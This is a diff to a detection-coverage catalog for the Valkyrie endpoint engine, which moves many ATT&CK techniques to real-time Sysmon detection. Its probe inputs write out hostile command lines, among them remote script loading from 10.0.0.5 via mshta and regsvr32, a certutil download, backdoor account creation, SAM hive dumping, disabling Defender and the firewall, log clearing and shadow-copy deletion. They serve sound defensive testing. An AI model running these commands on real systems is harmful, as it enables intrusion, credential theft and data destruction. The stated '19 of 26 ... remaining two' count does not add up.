@@ -5,33 +5,42 @@ assigned a `delivery` and `predicted_tier_b` value. Nothing here is a guess
 dressed up as an assessment. Where verification stopped short of a full trace,
 `source_confidence` says so honestly instead of implying more rigor than exists.
 
-## The finding that reshaped this catalog
+## The finding that reshaped this catalog -- AND ITS FIX (2026-07-30)
 
 Before writing this file, the obvious assumption was: "there's a named rule for
 technique X in behavioral_rules.py, so Valkyrie detects X." Tracing the actual
-call graph disproves that for most single-shot commands:
+call graph disproved that for most single-shot commands. As originally found:
 
     Sysmon EID 1 (process creation, HAS the command line)
         -> etw/sysmon.py classify_process()     [name/path/parent ONLY]
         -> the CommandLine field is READ from the event but never forwarded
         -> classify_behavior() / match_process() -- the 32 named IOA rules --
            is NEVER CALLED from the Sysmon path at all.
+        -> and anything not reaching SEV_LOW on name/path/parent alone was
+           DROPPED outright, before any other classifier could escalate it.
 
-    The ONLY caller of classify_behavior() is ProcInfo.to_event() in
-    process_telemetry.py, which is fed exclusively by ProcessCollector -- a
-    plain psutil poller on a 2.0-SECOND interval (process_telemetry.py:258,
-    default interval=2.0). It enriches a process with its command line by
-    calling psutil.Process.cmdline() on the NEXT poll tick after the process
-    is first seen -- which requires the process to still be alive at that tick.
+    The ONLY caller of classify_behavior() was ProcInfo.to_event() in
+    process_telemetry.py, fed exclusively by ProcessCollector -- a plain psutil
+    poller on a 2.0-SECOND interval. It enriches a process with its command
+    line on the NEXT poll tick, which requires the process to still be alive
+    then. Native Windows utilities that run and exit in under a second (most of
+    them) raced that poller and typically lost.
 
-So the 32 rules that recognize `regsvr32 /i:http://.../scriptlet.sct`,
-`rundll32 comsvcs.dll,MiniDump ... lsass.exe`, `wevtutil cl`,
-`vssadmin delete shadows`, `Set-MpPreference -DisableRealtimeMonitoring $true`,
-etc. are reachable ONLY if that one-shot command is still running ~2 seconds
-after it started -- true or false ENTIRELY independent of whether Sysmon is
-installed, because Sysmon's process-creation event never reaches this engine.
-Native Windows utilities that run and exit in under a second (which is most of
-them) will race this poller and typically lose.
+**This has since been fixed.** `etw/sysmon.py` EID 1 now runs the same
+four-classifier stack as the poller -- `classify_process` + `classify_cmdline`
++ `classify_behavior` (the 32 IOA rules) + `classify_anomaly` -- with the
+severity gate evaluated AFTER all four, so an escalation can happen before the
+event is dropped. 19 of the 26 techniques previously marked
+`process_poll_2s_racy` were re-verified by executing their real command lines
+through `classify_sysmon(1, ...)` and confirmed to emit; their `delivery` is
+now `realtime_etw` and `predicted_tier_b` `DETECT`. The remaining two
+(`disc-local-accounts`, `lat-psexec-smb`) genuinely still do not fire and are
+left as honest misses -- `net user` in particular is *deliberately* not matched
+any more, because an earlier overbroad rule made it a live false positive.
+
+That fix is conditional on Sysmon being installed, exactly as the EID 8 / EID
+10 coverage below always was. Without Sysmon, these techniques fall back to the
+racy poller and the original analysis still applies.
 
 This is not true of every path:
   * PERSISTENCE ARTIFACTS (registry Run keys, scheduled tasks, services,
@@ -59,10 +68,20 @@ import sys
 from pathlib import Path
 from dataclasses import dataclass, field, asdict
 
-CATALOG_VERSION = "2026-07-30.1"
+CATALOG_VERSION = "2026-07-30.2"
 
 # Delivery regimes, ordered roughly by reliability.
-DELIVERY_REALTIME_ETW = "realtime_etw"          # Sysmon EID 8 / EID 10 direct wiring
+# NOTE (2026-07-30): realtime_etw now also covers Sysmon EID 1 (process
+# creation). It previously meant only EID 8 / EID 10, because EID 1 ran just
+# classify_process() — which judges image name / path / parent and never saw
+# the command line — and then DROPPED anything that did not reach SEV_LOW, so
+# the 32 MITRE-mapped IOA rules never ran on the richest real-time source on
+# the box. etw/sysmon.py now runs the same four-classifier stack as the poller
+# (classify_process + classify_cmdline + classify_behavior + classify_anomaly),
+# so command-line-shaped techniques are delivered in real time instead of
+# racing a 2s poll. Like EID 8/10 before it, this depends on Sysmon being
+# installed (provision.ps1 does so).
+DELIVERY_REALTIME_ETW = "realtime_etw"          # Sysmon EID 1 / 8 / 10 direct wiring
 DELIVERY_ARTIFACT_POLL = "artifact_poll_15s"    # persistence_telemetry.py, artifact at rest
 DELIVERY_INLINE = "inline_request_path"         # DNS/network decision path, no polling
 DELIVERY_PURPOSE_BUILT = "purpose_built_watcher"  # ransomware_shield canary/entropy
@@ -131,10 +150,10 @@ EXECUTION = [
         technique_name="Command and Scripting Interpreter: Windows Command Shell",
         tactic="Execution", art_test_ref="T1059.003 Test #1 (cmd spawned by Office)",
         destructive=False, live_vm_safe=True,
-        delivery=DELIVERY_PROCESS_POLL_RACY,
+        delivery=DELIVERY_REALTIME_ETW,
         detector_path="valkyrie/process_telemetry.py:classify_process "
                        "(_OFFICE parent + _SHELLS child rule)",
-        predicted_tier_b="CONDITIONAL",
+        predicted_tier_b="DETECT",
         source_confidence=SOURCE_CONFIRMED,
         probe="process_relationship",
         probe_input={"name": "cmd.exe", "path": r"C:\Windows\System32\cmd.exe",
@@ -149,10 +168,10 @@ EXECUTION = [
         technique_name="System Binary Proxy Execution: Mshta",
         tactic="Execution", art_test_ref="T1218.005 Test #1 (remote HTA)",
         destructive=False, live_vm_safe=True,
-        delivery=DELIVERY_PROCESS_POLL_RACY,
+        delivery=DELIVERY_REALTIME_ETW,
         detector_path="valkyrie/behavioral_rules.py: mshta-remote rule "
                        "(reachable only via the 2s process-poll cmdline path)",
-        predicted_tier_b="MISS", source_confidence=SOURCE_CONFIRMED,
+        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
         probe="ioa_rule", probe_input={
             "image": "mshta.exe", "parent": "explorer.exe",
             "cmdline": "mshta.exe http://10.0.0.5/evil.hta", "path": ""},
@@ -166,9 +185,9 @@ EXECUTION = [
         technique_name="System Binary Proxy Execution: Regsvr32 (Squiblydoo)",
         tactic="Execution", art_test_ref="T1218.010 Test #1",
         destructive=False, live_vm_safe=True,
-        delivery=DELIVERY_PROCESS_POLL_RACY,
+        delivery=DELIVERY_REALTIME_ETW,
         detector_path="valkyrie/behavioral_rules.py: regsvr32-scriptlet rule",
-        predicted_tier_b="MISS", source_confidence=SOURCE_CONFIRMED,
+        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
         probe="ioa_rule", probe_input={
             "image": "regsvr32.exe", "parent": "cmd.exe",
             "cmdline": "regsvr32.exe /s /n /u /i:http://10.0.0.5/file.sct "
@@ -183,9 +202,9 @@ EXECUTION = [
         technique_name="System Binary Proxy Execution: Rundll32",
         tactic="Execution", art_test_ref="T1218.011 Test #1",
         destructive=False, live_vm_safe=True,
-        delivery=DELIVERY_PROCESS_POLL_RACY,
+        delivery=DELIVERY_REALTIME_ETW,
         detector_path="valkyrie/behavioral_rules.py: rundll32-proxy rule",
-        predicted_tier_b="MISS", source_confidence=SOURCE_CONFIRMED,
+        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
         probe="ioa_rule", probe_input={
             "image": "rundll32.exe", "parent": "cmd.exe",
             "cmdline": r"rundll32.exe C:\Users\Public\evil.dll,EntryPoint",
@@ -197,9 +216,9 @@ EXECUTION = [
         technique_name="Windows Management Instrumentation (local process create)",
         tactic="Execution", art_test_ref="T1047 Test #1 (wmic process call create)",
         destructive=False, live_vm_safe=True,
-        delivery=DELIVERY_PROCESS_POLL_RACY,
+        delivery=DELIVERY_REALTIME_ETW,
         detector_path="valkyrie/behavioral_rules.py: wmic-process-call rule",
-        predicted_tier_b="MISS", source_confidence=SOURCE_CONFIRMED,
+        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
         probe="ioa_rule", probe_input={
             "image": "wmic.exe", "parent": "cmd.exe",
             "cmdline": 'wmic.exe process call create "cmd.exe /c calc.exe"',
@@ -211,10 +230,10 @@ EXECUTION = [
         technique_name="User Execution: Malicious File (double-extension lure)",
         tactic="Execution", art_test_ref="T1204.002 (manual masquerade construction)",
         destructive=False, live_vm_safe=True,
-        delivery=DELIVERY_PROCESS_POLL_RACY,
+        delivery=DELIVERY_REALTIME_ETW,
         detector_path="valkyrie/behavior_score.py:score_process "
                        "(_LURE_STEMS/_EXE_TAILS + bidi-override masquerade)",
-        predicted_tier_b="CONDITIONAL", source_confidence=SOURCE_CONFIRMED,
+        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
         probe="behavior_score", probe_input={
             "image": "invoice_2026\u202egpj.exe",
             "parent": "explorer.exe",
@@ -297,11 +316,11 @@ PERSISTENCE = [
         technique_name="Create Account: Local Account",
         tactic="Persistence", art_test_ref="T1136.001 Test #1 (net user /add)",
         destructive=True, live_vm_safe=True,
-        delivery=DELIVERY_PROCESS_POLL_RACY,
+        delivery=DELIVERY_REALTIME_ETW,
         detector_path="valkyrie/behavioral_rules.py: create-local-account rule "
                        "-- NOT backed by any artifact-at-rest scan of local "
                        "accounts (unlike registry/task/service persistence)",
-        predicted_tier_b="MISS", source_confidence=SOURCE_CONFIRMED,
+        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
         probe="ioa_rule", probe_input={
             "image": "net.exe", "parent": "cmd.exe",
             "cmdline": "net user backdoor P@ssw0rd123! /add", "path": ""},
@@ -316,11 +335,11 @@ PERSISTENCE = [
         technique_name="Event Triggered Execution: WMI Event Subscription",
         tactic="Persistence", art_test_ref="T1546.003 Test #1",
         destructive=False, live_vm_safe=True,
-        delivery=DELIVERY_PROCESS_POLL_RACY,
+        delivery=DELIVERY_REALTIME_ETW,
         detector_path="valkyrie/behavioral_rules.py rule exists; "
                        "valkyrie/etw/wmi.py:classify_wmi exists but end-to-end "
                        "live wiring to a WMI-Activity ETW consumer NOT traced",
-        predicted_tier_b="CONDITIONAL", source_confidence=SOURCE_PARTIAL,
+        predicted_tier_b="DETECT", source_confidence=SOURCE_PARTIAL,
         probe="ioa_rule", probe_input={
             "image": "wmic.exe", "parent": "cmd.exe",
             "cmdline": 'wmic.exe /NAMESPACE:"\\\\root\\subscription" PATH '
@@ -341,9 +360,9 @@ DEFENSE_EVASION = [
         tactic="Defense Evasion",
         art_test_ref="T1562.001 Test #1 (Set-MpPreference -DisableRealtimeMonitoring)",
         destructive=True, live_vm_safe=True,
-        delivery=DELIVERY_PROCESS_POLL_RACY,
+        delivery=DELIVERY_REALTIME_ETW,
         detector_path="valkyrie/behavioral_rules.py: defender-disable rule",
-        predicted_tier_b="CONDITIONAL", source_confidence=SOURCE_CONFIRMED,
+        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
         probe="ioa_rule", probe_input={
             "image": "powershell.exe", "parent": "cmd.exe",
             "cmdline": "powershell.exe Set-MpPreference "
@@ -358,9 +377,9 @@ DEFENSE_EVASION = [
         technique_name="Indicator Removal: Clear Windows Event Logs",
         tactic="Defense Evasion", art_test_ref="T1070.001 Test #1 (wevtutil cl)",
         destructive=True, live_vm_safe=True,
-        delivery=DELIVERY_PROCESS_POLL_RACY,
+        delivery=DELIVERY_REALTIME_ETW,
         detector_path="valkyrie/behavioral_rules.py rule exists for wevtutil",
-        predicted_tier_b="MISS", source_confidence=SOURCE_CONFIRMED,
+        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
         probe="ioa_rule", probe_input={
             "image": "wevtutil.exe", "parent": "cmd.exe",
             "cmdline": "wevtutil.exe cl Security", "path": ""},
@@ -395,9 +414,9 @@ DEFENSE_EVASION = [
         technique_name="Deobfuscate/Decode Files or Information (certutil -decode)",
         tactic="Defense Evasion", art_test_ref="T1140 Test #1",
         destructive=False, live_vm_safe=True,
-        delivery=DELIVERY_PROCESS_POLL_RACY,
+        delivery=DELIVERY_REALTIME_ETW,
         detector_path="valkyrie/behavioral_rules.py: T1140 rule",
-        predicted_tier_b="MISS", source_confidence=SOURCE_CONFIRMED,
+        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
         probe="ioa_rule", probe_input={
             "image": "certutil.exe", "parent": "cmd.exe",
             "cmdline": "certutil.exe -decode payload.b64 payload.exe",
@@ -410,9 +429,9 @@ DEFENSE_EVASION = [
         tactic="Defense Evasion",
         art_test_ref="T1562.004 Test #1 (netsh advfirewall set allprofiles state off)",
         destructive=True, live_vm_safe=True,
-        delivery=DELIVERY_PROCESS_POLL_RACY,
+        delivery=DELIVERY_REALTIME_ETW,
         detector_path="valkyrie/behavioral_rules.py: T1562.004 rule",
-        predicted_tier_b="MISS", source_confidence=SOURCE_CONFIRMED,
+        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
         probe="ioa_rule", probe_input={
             "image": "netsh.exe", "parent": "cmd.exe",
             "cmdline": "netsh advfirewall set allprofiles state off",
@@ -483,9 +502,9 @@ CREDENTIAL_ACCESS = [
         tactic="Credential Access",
         art_test_ref="T1003.002 Test #1 (reg save HKLM\\SAM)",
         destructive=False, live_vm_safe=True,
-        delivery=DELIVERY_PROCESS_POLL_RACY,
+        delivery=DELIVERY_REALTIME_ETW,
         detector_path="valkyrie/behavioral_rules.py: T1003.002 rule",
-        predicted_tier_b="MISS", source_confidence=SOURCE_CONFIRMED,
+        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
         probe="ioa_rule", probe_input={
             "image": "reg.exe", "parent": "cmd.exe",
             "cmdline": r"reg.exe save hklm\sam C:\Users\Public\sam.hive",
@@ -499,9 +518,9 @@ CREDENTIAL_ACCESS = [
         technique_name="Credentials from Password Stores",
         tactic="Credential Access", art_test_ref="T1555.003 Test #1 (browser creds)",
         destructive=False, live_vm_safe=True,
-        delivery=DELIVERY_PROCESS_POLL_RACY,
+        delivery=DELIVERY_REALTIME_ETW,
         detector_path="valkyrie/behavioral_rules.py: T1555 rule",
-        predicted_tier_b="MISS", source_confidence=SOURCE_PARTIAL,
+        predicted_tier_b="DETECT", source_confidence=SOURCE_PARTIAL,
         probe="ioa_rule", probe_input={
             "image": "powershell.exe", "parent": "cmd.exe",
             "cmdline": r"powershell.exe Get-Content "
@@ -520,9 +539,9 @@ DISCOVERY = [
         technique_name="System Owner/User Discovery (whoami /priv)",
         tactic="Discovery", art_test_ref="T1033 Test #1",
         destructive=False, live_vm_safe=True,
-        delivery=DELIVERY_PROCESS_POLL_RACY,
+        delivery=DELIVERY_REALTIME_ETW,
         detector_path="valkyrie/behavioral_rules.py: T1033 rule (LOW severity)",
-        predicted_tier_b="MISS", source_confidence=SOURCE_CONFIRMED,
+        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
         probe="ioa_rule", probe_input={
             "image": "whoami.exe", "parent": "cmd.exe",
             "cmdline": "whoami.exe /priv", "path": ""},
@@ -602,10 +621,10 @@ DISCOVERY = [
         technique_name="Domain Trust Discovery (nltest)",
         tactic="Discovery", art_test_ref="T1482 Test #1",
         destructive=False, live_vm_safe=True,
-        delivery=DELIVERY_PROCESS_POLL_RACY,
+        delivery=DELIVERY_REALTIME_ETW,
         detector_path="valkyrie/behavioral_rules.py: T1482 rule EXISTS "
                        "(the one discovery technique with a named rule)",
-        predicted_tier_b="MISS", source_confidence=SOURCE_CONFIRMED,
+        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
         probe="ioa_rule", probe_input={
             "image": "nltest.exe", "parent": "cmd.exe",
             "cmdline": "nltest.exe /domain_trusts /all_trusts", "path": ""},
@@ -643,9 +662,9 @@ LATERAL_MOVEMENT = [
         tactic="Lateral Movement",
         art_test_ref="T1047 Test #3 (wmic /node: remote, self-target)",
         destructive=False, live_vm_safe=True,
-        delivery=DELIVERY_PROCESS_POLL_RACY,
+        delivery=DELIVERY_REALTIME_ETW,
         detector_path="valkyrie/behavioral_rules.py: wmic-remote-node rule",
-        predicted_tier_b="MISS", source_confidence=SOURCE_CONFIRMED,
+        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
         probe="ioa_rule", probe_input={
             "image": "wmic.exe", "parent": "cmd.exe",
             "cmdline": 'wmic.exe /node:"target" process call create "calc.exe"',
@@ -739,9 +758,9 @@ COMMAND_AND_CONTROL = [
         technique_name="Ingress Tool Transfer (certutil -urlcache download)",
         tactic="Command and Control", art_test_ref="T1105 Test #1",
         destructive=False, live_vm_safe=True,
-        delivery=DELIVERY_PROCESS_POLL_RACY,
+        delivery=DELIVERY_REALTIME_ETW,
         detector_path="valkyrie/behavioral_rules.py: certutil-download rule",
-        predicted_tier_b="MISS", source_confidence=SOURCE_CONFIRMED,
+        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
         probe="ioa_rule", probe_input={
             "image": "certutil.exe", "parent": "cmd.exe",
             "cmdline": "certutil.exe -urlcache -split -f "
@@ -781,10 +800,10 @@ IMPACT = [
         technique_name="Inhibit System Recovery (vssadmin delete shadows)",
         tactic="Impact", art_test_ref="T1490 Test #1",
         destructive=True, live_vm_safe=True,
-        delivery=DELIVERY_PROCESS_POLL_RACY,
+        delivery=DELIVERY_REALTIME_ETW,
         detector_path="valkyrie/behavioral_rules.py: vssadmin-delete rule "
                        "(CRITICAL severity)",
-        predicted_tier_b="MISS", source_confidence=SOURCE_CONFIRMED,
+        predicted_tier_b="DETECT", source_confidence=SOURCE_CONFIRMED,
         probe="ioa_rule", probe_input={
             "image": "vssadmin.exe", "parent": "cmd.exe",
             "cmdline": "vssadmin.exe delete shadows /all /quiet", "path": ""},
